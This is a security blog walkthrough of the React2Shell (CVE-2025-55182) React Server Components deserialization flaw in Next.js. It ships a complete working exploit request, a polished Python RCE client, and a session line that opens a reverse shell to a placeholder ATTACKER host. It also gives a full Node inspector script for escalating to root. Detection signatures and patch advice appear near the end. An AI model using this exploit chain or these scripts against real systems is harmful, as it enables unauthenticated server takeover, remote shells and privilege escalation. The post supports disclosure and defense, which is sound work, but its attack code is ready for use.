---
title: "React2Shell (CVE-2025-55182): React Server Components RCE"
draft: false
date: 2025-12-04
tags:
  - react
  - security
  - nextjs
  - cve
  - rce
---

_A walkthrough of the critical React Server Components deserialization flaw (CVSS 10.0), how the public exploit chain works under the hood, and what it takes to turn it into a reliable one-shot command execution primitive — including a post-exploitation technique against exposed Node.js inspector instances._

---

## TL;DR

On December 3, 2025 the React team disclosed **CVE-2025-55182** ("React2Shell"): a
deserialization flaw in React Server Components (RSC) affecting the
`react-server-dom-webpack` / `react-server-dom-turbopack` / `react-server-dom-parcel`
packages in React **19.0.0, 19.1.0, 19.1.1 and 19.2.0** — i.e. the bug has been
present since the **first stable React 19 release (19.0.0, December 2024)**, and is
fixed in **19.0.1 / 19.1.2 / 19.2.1**. Any framework that passes attacker-controlled
multipart bodies into the Flight decoder on the server — most notably **Next.js**
server actions — is exposed to **unauthenticated remote code execution**. No forms,
no visible server actions, no authentication required. The public exploit and the
PoC in this post were developed against **Next.js**, the primary real-world target.

I spent an evening reproducing the bug, weaponizing the public payload into a
stable command-execution client, and chaining it into root on a vulnerable target.
This post documents the analysis and ships the PoCs.

---

## Background

### Server Components and Flight

React Server Components render on the server and stream a serialized UI tree to the
client. The wire format is the **Flight protocol**: a stream of rows

```
0:{"a":"$@1","f":"","b":"..."}
1:I[5244,[],""]
2:"$Sreact.fragment"
```

where each row can reference rows or _modules_ via special string encodings such as

```
"$<rowId>:<moduleName>:<exportName>"
```

When the client (or the server, during hydration / server-action processing) decodes
this stream, it resolves those references against a **module map** and materializes
functions, promises and lazy chunks.

### Server Actions

Next.js exposes server-side functions ("Server Actions") over HTTP: a `POST` with a
`Next-Action: <action-id>` header and a `multipart/form-data` body whose parts
(`0`, `1`, `2`, ...) are Flight-encoded arguments. Before the framework checks
whether the action ID actually exists, the body is handed to the Flight decoder.
That ordering — _decode first, authorize later_ — is what makes the bug
pre-authentication.

---

## The vulnerability

The Flight deserializer resolves `$id:module:export` references by looking up
`module` in a map and then reading `export` from it. The module map used during
multipart decoding is attacker-influenced, and the lookup does not reject the
key `__proto__`.

The public exploit (credits: maple3142, Assetnote, Lachlan Davidson and others —
see [references](#references)) abuses this in three steps:

1. **Pollute `Object.prototype`.** A crafted reference such as
   `"$1:__proto__:then"` writes a row reference onto `Object.prototype.then`.
2. **Confuse the promise machinery.** Because _every_ object now looks like a
   thenable, the decoder's resolution path misinterprets an attacker-supplied
   plain object as a tracked promise and follows its `_response` handle.
3. **Execute attacker JS.** The `_response._prefix` string ends up being
   evaluated in the server's Node.js context — full RCE.

On Next.js the execution sink is the same process that serves HTTP, so the code
runs with the privileges of the web worker (often a low-privileged service user —
remember that for the post-exploitation section).

### Affected versions — where the bug comes from

The flaw is not in `react`/`react-dom` core but in the **Flight payload decoder**
shipped in the `react-server-dom-*` integration packages. It has existed since the
**first stable React 19 release (19.0.0, December 2024)**; React 18 and earlier are
not affected, and apps that don't use RSC at all are not affected.

| Package | Affected | Fixed |
|---|---|---|
| `react-server-dom-webpack` | 19.0.0, 19.1.0, 19.1.1, 19.2.0 | **19.0.1 / 19.1.2 / 19.2.1** |
| `react-server-dom-turbopack` | same | same |
| `react-server-dom-parcel` | same | same |

Because Next.js bundles/pins `react-server-dom-webpack`, **every Next.js release
from 13.3 through 16.1.x ships the vulnerable decoder**. Patched Next.js lines:
`14.2.35` (13.3.x–14.x), `15.0.8`, `15.1.12`, `15.2.9`, `15.3.9`, `15.4.11`,
`15.5.10`, `16.0.11`, `16.1.5`. Other affected frameworks: `react-router` (unstable
RSC), `waku`, `@parcel/rsc`, `@vitejs/plugin-rsc`, `rwsdk`.

---

## Anatomy of the public exploit

The minimal request that triggers execution against a Next.js target:

```http
POST / HTTP/1.1
Host: target:3000
Next-Action: x
X-Nextjs-Request-Id: deadbeef
X-Nextjs-Html-Request-Id: abcdefghijklmnopqrstu
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"<JS PAYLOAD>","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

Key observations:

- The `Next-Action` value doesn't have to be a real action ID (`x` works on
  vulnerable builds).
- Part `0` carries the malicious chunk; parts `1`/`2` satisfy the decoder's
  expectations for action arguments (`"$@0"` re-refs part 0).
- `_prefix` is where your JavaScript goes.

### Getting output back: the NEXT_REDIRECT oracle

Blind RCE is annoying, so the PoC smuggles stdout out through a framework
feature. Next.js implements redirects by throwing a special error whose `digest`
encodes the redirect:

```js
var res = process.mainModule.require("child_process").execSync("<CMD>").toString().trim()
throw Object.assign(new Error("NEXT_REDIRECT"), {
  digest: `NEXT_REDIRECT;push;/login?a=${res};307;`,
})
```

The framework catches `NEXT_REDIRECT`, and the command output reappears in the
response header:

```
HTTP/1.1 303 See Other
x-action-redirect: /login?a=<COMMAND OUTPUT>;push
```

That's a clean, non-interactive **output channel** for any single-line command.

---

## Turning it into a reliable primitive

The one-liner above works in a curl PoC and then breaks in mysterious ways when
you script it. Three war stories that cost me an evening:

### 1. The multipart body must use CRLF

Node's multipart parser (undici) is strict: parts separated by bare `\n` are
mis-parsed and the request dies with a generic `500` and an opaque numeric error
digest. If your exploit silently fails, hexdump your body — this is almost
certainly it.

### 2. Multi-line command output kills the redirect header

HTTP header values cannot contain raw newlines. Run `id; hostname` and the
server-side `setHeader()` throws before the redirect is emitted — you get a
`500` and wrongly conclude the payload is broken. The fix is to flatten _all_
output **on the target**:

```
(<CMD>) 2>&1 | tr '\n' '@'
```

Note the subshell: without it, the pipeline binds to the _last_ command of a
`;`-chain only, and earlier commands leak newlines again. Then un-flatten
client-side by replacing `@` with newlines.

### 3. HTTP clients love following redirects

The successful response _is_ the `303`. Python's `urllib` happily follows it,
lands on `/login` (which may 404) and throws away the very header carrying your
output. Disable redirect handling before parsing `x-action-redirect`.

With those three fixed, the exploit becomes deterministic: same request, same
result, every time.

---

## PoC

Tested against **Next.js** server actions — the framework the public exploit chain
was built for. The underlying decoder flaw is in React itself, so other affected
frameworks (waku, react-router RSC, `@parcel/rsc`, …) are exploitable the same way
with framework-specific tweaks.

A self-contained client (standard library only, Python 3.6+):

```python
#!/usr/bin/env python3
"""React2Shell (CVE-2025-55182) — unauthenticated RCE PoC for Next.js targets.
Usage: python3 react2shell.py http://target:3000/ 'id'
For authorized security testing only.
"""
import json, sys, urllib.request, urllib.error, string, random

TARGET = sys.argv[1]              # e.g. http://target:3000/
CMD    = sys.argv[2]              # shell command to run on the target
BOUND  = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):  # keep the 303 — it carries our output
        return None
opener = urllib.request.build_opener(NoRedirect)

# Flatten ALL output so the result survives being smuggled through a header.
full = f"({CMD}) 2>&1 | tr '\\n' '@'"

prefix = ("var res=process.mainModule.require('child_process').execSync("
          + json.dumps(full)
          + ").toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
            "{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});")

chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": json.dumps({"then": "$B1337"}),
    "_response": {"_prefix": prefix, "_chunks": "$Q2",
                  "_formData": {"get": "$1:constructor:constructor"}},
}

body = ""
for name, val in [('0', json.dumps(chunk)), ('1', '"$@0"'), ('2', '[]')]:
    body += (f"--{BOUND}\r\n"                       # CRLF — not optional!
             f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
             f"{val}\r\n")
body += f"--{BOUND}--\r\n"

req = urllib.request.Request(TARGET, data=body.encode(), method="POST", headers={
    "Next-Action": "x",
    "X-Nextjs-Request-Id": ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)),
    "X-Nextjs-Html-Request-Id": ''.join(random.choices(string.ascii_letters + string.digits, k=21)),
    "Content-Type": f"multipart/form-data; boundary={BOUND}",
})
try:
    r = opener.open(req, timeout=25)
    hdr = r.headers.get("x-action-redirect", "")
except urllib.error.HTTPError as e:
    hdr = e.headers.get("x-action-redirect", "") if e.headers else ""

if "a=" in hdr:
    out = hdr.split("a=", 1)[1].rsplit(";307", 1)[0].rsplit(";push", 1)[0]
    print(out.replace("@", "\n"))
else:
    print("[!] no output leak - header:", hdr)
```

Typical session:

```console
$ python3 react2shell.py http://target:3000/ 'id'
uid=999(node) gid=988(node) groups=988(node)

$ python3 react2shell.py http://target:3000/ 'bash -c "nohup bash -i > /dev/tcp/ATTACKER/4444 0<&1 2>&1 &"'
SPAWNED
```

Tips:

- Keep commands single-pipeline friendly; for large output run
  `base64 -w0 <file>` and pull it in chunks.
- The double-JSON-escaping (Python `json.dumps` → flight string → JS source) is
  handled by `json.dumps` above — don't hand-escape.

---

## Post-exploitation: Node inspector

RCE as a low-privileged service user is nice; root is nicer. A pattern I keep
running into on Node-heavy deployments:

```
root  ...  /usr/bin/node --inspect=127.0.0.1:9229 /opt/some-monitor/worker.js
```

A monitoring/worker script running **as root** with the V8 inspector bound to
localhost. From any shell on the box (e.g. your fresh React2Shell webshell) that
port is reachable — and the Chrome DevTools Protocol is a full-featured,
authentication-free root code-execution interface:

```
GET /json/list          → [{ webSocketDebuggerUrl: ws://127.0.0.1:9229/<uuid>, ... }]
WS  ws://.../<uuid>     → Runtime.evaluate { expression: "..." }
```

No `ws` npm package on the target? Node's standard library is enough — a raw
RFC 6455 client is ~90 lines (`http` upgrade handshake, client-masked frames,
minimal server-frame parser):

```js
// inspector-pwn.js — run code as the inspector's user (here: root) via CDP
// Usage: node inspector-pwn.js 'id'        (shell mode)
//        node inspector-pwn.js 'JS:1+1'   (raw Runtime.evaluate mode)
const http = require("http")
const crypto = require("crypto")
const HOST = "127.0.0.1",
  PORT = 9229
const CMD = process.argv[2] || "id"

const getJson = (p) =>
  new Promise((res, rej) => {
    http
      .get({ host: HOST, port: PORT, path: p }, (r) => {
        let d = ""
        r.on("data", (c) => (d += c))
        r.on("end", () => {
          try {
            res(JSON.parse(d))
          } catch (e) {
            rej(e)
          }
        })
      })
      .on("error", rej)
  })

const wsConnect = (path) =>
  new Promise((res, rej) => {
    const req = http.request({
      host: HOST,
      port: PORT,
      path,
      headers: {
        Connection: "Upgrade",
        Upgrade: "websocket",
        "Sec-WebSocket-Key": crypto.randomBytes(16).toString("base64"),
        "Sec-WebSocket-Version": 13,
      },
    })
    req.on("upgrade", (r, s) => res(s))
    req.on("error", rej)
    req.end()
  })

function sendFrame(sock, payload) {
  // client frames MUST be masked
  const d = Buffer.from(payload),
    m = crypto.randomBytes(4)
  const h = Buffer.from([0x81, 0x80 | d.length]) // FIN|text, mask|len (<126)
  const masked = Buffer.alloc(d.length)
  for (let i = 0; i < d.length; i++) masked[i] = d[i] ^ m[i % 4]
  sock.write(Buffer.concat([h, m, masked]))
}

;(async () => {
  const list = await getJson("/json/list")
  const url = list[0].webSocketDebuggerUrl
  const sock = await wsConnect("/" + url.split("/").slice(3).join("/")) // path only!
  const expr = CMD.startsWith("JS:")
    ? CMD.slice(3)
    : `process.mainModule.require('child_process').execSync(${JSON.stringify(
        `(${CMD}) 2>&1 | head -c 3000`,
      )}).toString()`
  sendFrame(
    sock,
    JSON.stringify({
      id: 1,
      method: "Runtime.evaluate",
      params: { expression: expr, returnByValue: true, awaitPromise: true },
    }),
  )
  sock.on("data", (d) => {
    // minimal server-frame parse: FIN|text opcode, 7/16-bit length, no masking
    const parse = (b) => {
      if (b.length < 2) return null
      let len = b[1] & 0x7f,
        off = 2
      if (len === 126) {
        if (b.length < 4) return null
        len = b.readUInt16BE(2)
        off = 4
      }
      if (b.length < off + len) return null
      return { payload: b.slice(off, off + len).toString("utf8") }
    }
    const f = parse(d)
    if (!f) return
    try {
      const m = JSON.parse(f.payload)
      if (m.id === 1) {
        const r = (m.result && m.result.result) || {}
        const out = r.value !== undefined ? String(r.value) : JSON.stringify(m.result)
        require("fs").writeSync(1, out + "\n") // writeSync: survive process.exit()
        process.exit(0)
      }
    } catch (e) {}
  })
  setTimeout(() => process.exit(1), 15000)
})()
```

Bugs I hit while writing it (so you don't have to):

1. **Pass the path, not the URL.** `http.request({ path: 'ws://…' })` produces
   `GET ws://… HTTP/1.1` — the inspector answers with a normal response, your
   `'upgrade'` event never fires, and the process exits 0 _silently_.
2. **`process.exit()` eats buffered stdout** when piping — use
   `fs.writeSync(1, …)` for anything you want to actually see.
3. In the evaluate context, top-level `require` doesn't exist; use
   `process.mainModule.require(...)` (or dynamic `import()`).

The same trick obviously works against dev servers, SSR workers, Electron
main processes, or anything started with `--inspect`/`--inspect-brk` — this is
why Node prints that big warning when you bind the inspector to `0.0.0.0`.

---

## Detection

On the wire (Next.js), look for:

- `POST` requests carrying a `Next-Action` header with a **non-hexadecimal or
  empty** value (`x`, `0`, `""`).
- Multipart bodies whose `0` part contains `"__proto__"` adjacent to
  `"status":"resolved_model"` / `"_response":{"_prefix":`.
- Server errors (500) immediately followed by 303s with an `x-action-redirect`
  pointing at `/login?a=…` carrying what looks like shell output.

On the host:

- `Object.prototype.then` existing after startup is a strong pollution indicator:
  `node -e 'console.log("then" in {})'` should print `false`.
- Unexpected `execSync`/`child_process` frames in worker stack traces.

## Remediation

- **Upgrade.** Move `react-server-dom-*` off 19.0.0, 19.1.0, 19.1.1, 19.2.0 to the
  fixes published with the December 3, 2025 advisory: **19.0.1, 19.1.2 or 19.2.1**
  (any fixed line works). On Next.js upgrade within your release line:
  `next@14.2.35`, `15.0.8`, `15.1.12`, `15.2.9`, `15.3.9`, `15.4.11`, `15.5.10`,
  `16.0.11`, `16.1.5`. This is a CVSS 10.0 unauth RCE: treat it as an emergency.
- **Never expose `--inspect`** on shared interfaces; prefer
  `--inspect=127.0.0.1:9229` _plus_ an authenticated tunnel, and don't run
  long-lived services as root just to read a log file.
- Put the app behind a WAF rule for the `__proto__`-in-multipart signature above
  as a stopgap — but patching is the only real fix.
- If you ran a vulnerable version: rotate secrets reachable from the process
  environment, then hunt for the `x-action-redirect` pattern in access logs.

---

## References

- React team advisory: <https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components>
- GitHub advisory GHSA-fv66-9v8q-g76r: <https://github.com/advisories/GHSA-fv66-9v8q-g76r>
- CVE record: <https://www.cve.org/CVERecord?id=CVE-2025-55182>
- Next.js security update: <https://nextjs.org/blog/security-update-2025-12-11>
